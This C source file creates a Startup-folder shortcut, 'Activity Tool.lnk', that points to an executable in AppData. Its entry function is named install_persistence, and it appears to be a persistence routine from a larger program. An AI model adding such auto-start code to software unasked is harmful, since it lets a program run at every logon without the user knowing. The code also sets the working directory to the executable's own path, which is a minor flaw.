#include "engine.h"


int save_shortcut(IShellLink *psl, const char *shortcutPath) {
    IPersistFile *ppf;
    auto hres = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void **) &ppf);

    if (SUCCEEDED(hres)) {
        wchar_t wsz[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, shortcutPath, -1, wsz, MAX_PATH);
        ppf->lpVtbl->Save(ppf, wsz, TRUE);
        ppf->lpVtbl->Release(ppf);
        return 1;
    }
    return 0;
}


void setup_shortcut_properties(IShellLink *psl, const char *appDataExePath) {
    psl->lpVtbl->SetPath(psl, appDataExePath);
    psl->lpVtbl->SetWorkingDirectory(psl, appDataExePath);
    psl->lpVtbl->SetIconLocation(psl, appDataExePath, 0);
}


int create_com_shortcut(const char *targetPath, const char *shortcutPath) {
    IShellLink *psl;
    auto hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (void **) &psl);

    if (SUCCEEDED(hres)) {
        setup_shortcut_properties(psl, targetPath);
        int result = save_shortcut(psl, shortcutPath);
        psl->lpVtbl->Release(psl);
        return result;
    }
    return 0;
}


void create_shortcut_in_startup_folder(const char *appDataExePath, const char *startupPath) {
    char shortcutPath[MAX_PATH];

    snprintf(shortcutPath, sizeof(shortcutPath), "%s\\Activity Tool.lnk", startupPath);
    if (!create_com_shortcut(appDataExePath, shortcutPath))
        fprintf(stderr, "Failed to create shortcut.\n");
}


int get_startup_folder_path(char *path) {
    auto hres = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, path);
    return SUCCEEDED(hres);
}


void install_persistence(const char *appDataExePath) {
    char startupPath[MAX_PATH];

    if (get_startup_folder_path(startupPath))
        create_shortcut_in_startup_folder(appDataExePath, startupPath);
    else
        fprintf(stderr, "Failed to get startup path.\n");
}
